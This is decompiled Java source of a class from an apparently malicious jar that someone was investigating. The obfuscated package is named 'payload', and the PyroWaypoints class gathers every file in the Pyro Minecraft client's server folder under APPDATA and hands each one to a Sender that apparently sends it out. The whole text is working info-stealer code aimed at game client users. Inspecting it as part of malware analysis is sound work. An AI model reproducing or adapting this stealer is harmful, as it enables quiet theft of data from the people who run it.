/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.FileUtil;
/*    */ import java.io.File;
/*    */ 
/*    */ 
/*    */ public final class PyroWaypoints
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 13 */     for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\server"))
/*    */     {
/* 15 */       Sender.send(file);
/*    */     }
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\PyroWaypoints.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */